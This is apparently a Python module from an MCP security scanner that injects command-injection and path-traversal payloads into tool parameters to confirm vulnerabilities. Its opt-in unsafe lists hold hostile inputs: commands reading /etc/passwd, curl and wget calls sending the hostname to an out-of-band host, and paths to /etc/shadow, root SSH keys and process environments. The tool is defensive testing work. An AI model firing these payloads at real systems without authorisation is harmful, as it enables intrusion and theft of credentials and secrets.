"""
Active Prober — canary-based black-box vulnerability confirmation.

Injects unique canary strings into every string parameter of every tool
and checks for the canary in the response. This produces CONFIRMED findings
rather than the MEDIUM-confidence metadata-based detections.

Two probers:
  CommandInjectionProber  — "; echo CANARY_ID" and variants
  PathTraversalProber     — "../../../etc/hostname" and variants

Safety defaults (ethical guardrails):
  --probe  flag required to run (never auto-runs)
  --safe   mode (default): canary payloads only, no writes, no reverse shells
  --unsafe mode: full destructive payload library (opt-in)

Timing-based detection:
  sleep-based payloads are tried when no canary echo is found,
  measuring response time vs baseline to detect blind injection.
"""

import asyncio
import hashlib
import os
import re
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Optional

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

from ..finding import UnifiedFinding, Severity, Confidence

console = Console()


def _make_canary() -> str:
    """Generate a unique probe canary string."""
    return f"mcploit_{uuid.uuid4().hex[:8]}"


# ─────────────────────────────────────────────────────────────────────────────
# Command Injection Prober
# ─────────────────────────────────────────────────────────────────────────────

SAFE_CMD_PAYLOADS = [
    # Linux — canary echo
    "; echo {canary}",
    "$(echo {canary})",
    "`echo {canary}`",
    " && echo {canary}",
    " || echo {canary}",
    "\n echo {canary}",
    # Windows — canary echo
    "& echo {canary}",
    "| echo {canary}",
    # Timing (blind — no echo, check duration)
    "; sleep 3",
    "$(sleep 3)",
    "& timeout 3",
]

UNSAFE_CMD_PAYLOADS = [
    "; cat /etc/passwd",
    "$(cat /etc/passwd)",
    "; id",
    "$(id)",
    "; whoami && hostname",
    "; curl http://{oob_host}/cmd-$(hostname)",
    "; wget -q http://{oob_host}/cmd-$(hostname) -O /dev/null",
]


@dataclass
class ProbeResult:
    """Result from a single probe attempt."""
    tool_name: str
    param_name: str
    payload: str
    canary: str
    success: bool
    confidence: str       # CONFIRMED / TIMING / MEDIUM
    evidence: str = ""
    response_time_ms: float = 0.0
    baseline_time_ms: float = 0.0
    error: str = ""


class CommandInjectionProber:
    """
    Tests each string parameter of each tool for command injection
    by injecting a unique canary and looking for it in the response.
    """

    def __init__(self, client, safe: bool = True, delay_ms: int = 500):
        self.client = client
        self.safe = safe
        self.delay_ms = delay_ms
        self.results: list[ProbeResult] = []

    async def probe(self, tools: list = None) -> list[ProbeResult]:
        """
        Probe all string-typed parameters across all tools.

        Args:
            tools: list of mcp Tool objects. If None, fetches from client.
        """
        if tools is None:
            try:
                tools = await self.client._client.list_tools()
            except Exception as e:
                console.print(f"[red]Failed to list tools: {e}[/red]")
                return []

        payloads = SAFE_CMD_PAYLOADS if self.safe else SAFE_CMD_PAYLOADS + UNSAFE_CMD_PAYLOADS

        console.print(f"\n  [cyan]💉 Command Injection Probe — {len(tools)} tool(s), {len(payloads)} payloads each[/cyan]")
        if not self.safe:
            console.print("  [red bold]⚠ UNSAFE mode — destructive payloads enabled[/red bold]")

        all_results = []
        for tool in tools:
            string_params = self._get_string_params(tool)
            if not string_params:
                continue

            # Measure baseline response time
            baseline_ms = await self._measure_baseline(tool, string_params[0])

            for param in string_params:
                for payload_tmpl in payloads:
                    canary = _make_canary()
                    payload = payload_tmpl.format(canary=canary, oob_host="canary.example.com")
                    result = await self._try_payload(tool, param, payload, canary, baseline_ms)
                    all_results.append(result)
                    if result.success:
                        console.print(
                            f"  [red bold]✓ CONFIRMED injection: {tool.name}.{param}[/red bold]\n"
                            f"    Payload: {payload!r}\n"
                            f"    Evidence: {result.evidence[:150]}"
                        )
                        # Stop probing this param after first hit
                        break
                    await asyncio.sleep(self.delay_ms / 1000)

        self.results = all_results
        return all_results

    async def _try_payload(
        self,
        tool,
        param_name: str,
        payload: str,
        canary: str,
        baseline_ms: float,
    ) -> ProbeResult:
        """Inject payload into a single tool parameter."""
        result = ProbeResult(
            tool_name=tool.name,
            param_name=param_name,
            payload=payload,
            canary=canary,
            success=False,
            confidence="LOW",
            baseline_time_ms=baseline_ms,
        )

        # Build minimal valid args
        args = self._build_args(tool, param_name, payload)
        t0 = time.time()
        try:
            resp = await self.client.call_tool(tool.name, args)
            elapsed = (time.time() - t0) * 1000
            result.response_time_ms = elapsed
            resp_str = str(resp)

            # Canary echo detection
            if canary in resp_str:
                result.success = True
                result.confidence = "CONFIRMED"
                result.evidence = resp_str[:400]

            # Timing-based blind detection (sleep payloads)
            elif "sleep" in payload or "timeout" in payload:
                if elapsed > baseline_ms + 2000:  # >2s over baseline
                    result.success = True
                    result.confidence = "TIMING"
                    result.evidence = f"Response time {elapsed:.0f}ms vs baseline {baseline_ms:.0f}ms"

        except Exception as e:
            result.error = str(e)

        return result

    async def _measure_baseline(self, tool, param_name: str) -> float:
        """Measure baseline response time with a benign value."""
        args = self._build_args(tool, param_name, "test_baseline_mcploit")
        t0 = time.time()
        try:
            await self.client.call_tool(tool.name, args)
        except Exception:
            pass
        return (time.time() - t0) * 1000

    def _get_string_params(self, tool) -> list[str]:
        """Get parameter names that accept strings."""
        params = []
        if not hasattr(tool, "inputSchema") or not tool.inputSchema:
            return params
        schema = tool.inputSchema if isinstance(tool.inputSchema, dict) else {}
        for name, prop in schema.get("properties", {}).items():
            if prop.get("type") in ("string", None):
                params.append(name)
        return params

    def _build_args(self, tool, inject_param: str, value: str) -> dict:
        """Build minimal valid args dict for a tool call."""
        args = {}
        if not hasattr(tool, "inputSchema") or not tool.inputSchema:
            return {inject_param: value}
        schema = tool.inputSchema if isinstance(tool.inputSchema, dict) else {}
        props = schema.get("properties", {})
        for name, prop in props.items():
            if name == inject_param:
                args[name] = value
            elif prop.get("type") == "integer":
                args[name] = 1
            elif prop.get("type") == "boolean":
                args[name] = False
            else:
                args[name] = "test"
        return args

    def to_findings(self) -> list[UnifiedFinding]:
        """Convert confirmed results to UnifiedFindings."""
        findings = []
        seen_tools = set()
        for r in self.results:
            if not r.success or r.tool_name in seen_tools:
                continue
            seen_tools.add(r.tool_name)
            conf = Confidence.CONFIRMED if r.confidence == "CONFIRMED" else Confidence.MEDIUM
            findings.append(UnifiedFinding(
                id=f"BB-PROBE-{len(findings)+1:03d}",
                title=f"Command Injection confirmed: {r.tool_name}.{r.param_name}",
                severity=Severity.CRITICAL,
                confidence=conf,
                source="active_probe",
                category="rce",
                location=f"tool:{r.tool_name}",
                description=(
                    f"Canary-based probe confirmed command injection in tool `{r.tool_name}` "
                    f"via parameter `{r.param_name}`. "
                    f"The injected canary `{r.canary}` was found in the server response, "
                    f"proving arbitrary OS command execution."
                ),
                evidence=r.evidence,
                recommendation=(
                    "Use subprocess with shell=False and a list of arguments. "
                    "Validate all tool inputs. Never pass user-supplied strings to shell commands."
                ),
                tool_name=r.tool_name,
            ))
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# Path Traversal Prober
# ─────────────────────────────────────────────────────────────────────────────

SAFE_PATH_PAYLOADS = [
    # Read hostname (safe, low-risk)
    "../../../etc/hostname",
    "../../etc/hostname",
    "../etc/hostname",
    # URL-encoded
    "../../../etc%2Fhostname",
    # Null byte
    "../../../etc/hostname\x00.txt",
    # Double slash
    "//..//..//..//etc/hostname",
    # Absolute path
    "/etc/hostname",
]

UNSAFE_PATH_PAYLOADS = [
    "../../../etc/passwd",
    "../../../etc/shadow",
    "../../../root/.ssh/id_rsa",
    "../../../proc/self/environ",
    "C:\\Windows\\win.ini",
]


class PathTraversalProber:
    """
    Tests file-path parameters for directory traversal.
    Uses /etc/hostname as the canary target (low-sensitivity, always present).
    """

    # Patterns indicating successful read of a system file
    SUCCESS_PATTERNS = [
        r"^[a-zA-Z0-9\-\.]+\s*$",    # hostname format
        r"127\.0\.0\.1\s+localhost",   # /etc/hosts
        r"root:.*:0:0:",               # /etc/passwd
        r"\[fonts\]",                  # win.ini
        r"-----BEGIN.*KEY-----",       # SSH key
        r"PATH=.*HOME=",               # environ
    ]

    def __init__(self, client, safe: bool = True, delay_ms: int = 300):
        self.client = client
        self.safe = safe
        self.delay_ms = delay_ms
        self.results: list[ProbeResult] = []

    async def probe(self, tools: list = None) -> list[ProbeResult]:
        if tools is None:
            try:
                tools = await self.client._client.list_tools()
            except Exception:
                return []

        file_tools = [t for t in tools if self._looks_like_file_tool(t)]
        if not file_tools:
            console.print("  [dim]Path traversal probe: no file-related tools detected[/dim]")
            return []

        payloads = SAFE_PATH_PAYLOADS if self.safe else SAFE_PATH_PAYLOADS + UNSAFE_PATH_PAYLOADS
        console.print(f"\n  [cyan]📁 Path Traversal Probe — {len(file_tools)} file tool(s)[/cyan]")

        all_results = []
        for tool in file_tools:
            path_params = self._get_path_params(tool)
            for param in path_params:
                for payload in payloads:
                    result = await self._try_path(tool, param, payload)
                    all_results.append(result)
                    if result.success:
                        console.print(
                            f"  [red bold]✓ PATH TRAVERSAL: {tool.name}.{param}[/red bold]\n"
                            f"    Read: {payload!r}\n"
                            f"    Evidence: {result.evidence[:150]}"
                        )
                        break
                    await asyncio.sleep(self.delay_ms / 1000)

        self.results = all_results
        return all_results

    async def _try_path(self, tool, param: str, path: str) -> ProbeResult:
        result = ProbeResult(
            tool_name=tool.name,
            param_name=param,
            payload=path,
            canary=path,
            success=False,
            confidence="LOW",
        )
        args = {param: path}
        try:
            resp = await self.client.call_tool(tool.name, args)
            resp_str = str(resp)
            for pattern in self.SUCCESS_PATTERNS:
                if re.search(pattern, resp_str, re.MULTILINE):
                    result.success = True
                    result.confidence = "CONFIRMED"
                    result.evidence = resp_str[:400]
                    break
            # Also flag non-error responses with content as MEDIUM
            if not result.success and len(resp_str) > 20 and "error" not in resp_str.lower():
                result.success = True
                result.confidence = "MEDIUM"
                result.evidence = f"Non-error file response: {resp_str[:200]}"
        except Exception as e:
            result.error = str(e)
        return result

    def _looks_like_file_tool(self, tool) -> bool:
        text = (tool.name + " " + (tool.description or "")).lower()
        return any(k in text for k in ("file", "read", "path", "directory", "folder", "write", "open"))

    def _get_path_params(self, tool) -> list[str]:
        params = []
        if not hasattr(tool, "inputSchema") or not tool.inputSchema:
            return params
        schema = tool.inputSchema if isinstance(tool.inputSchema, dict) else {}
        for name, prop in schema.get("properties", {}).items():
            if any(k in name.lower() for k in ("path", "file", "dir", "name", "location", "src", "dest")):
                params.append(name)
        return params or list(schema.get("properties", {}).keys())[:2]

    def to_findings(self) -> list[UnifiedFinding]:
        findings = []
        seen = set()
        for r in self.results:
            if not r.success or r.tool_name in seen:
                continue
            seen.add(r.tool_name)
            conf = Confidence.CONFIRMED if r.confidence == "CONFIRMED" else Confidence.MEDIUM
            findings.append(UnifiedFinding(
                id=f"BB-PT-{len(findings)+1:03d}",
                title=f"Path Traversal confirmed: {r.tool_name}.{r.param_name}",
                severity=Severity.HIGH,
                confidence=conf,
                source="active_probe",
                category="path_traversal",
                location=f"tool:{r.tool_name}",
                description=(
                    f"Active probe confirmed path traversal in `{r.tool_name}` via `{r.param_name}`. "
                    f"The payload `{r.payload}` succeeded, indicating files outside the intended "
                    f"workspace can be read."
                ),
                evidence=r.evidence,
                recommendation=(
                    "Resolve the path with os.path.realpath() and confirm it starts with "
                    "the expected base directory before opening. Reject any path containing '..'."
                ),
                cve="CVE-2025-67366",
                tool_name=r.tool_name,
            ))
        return findings
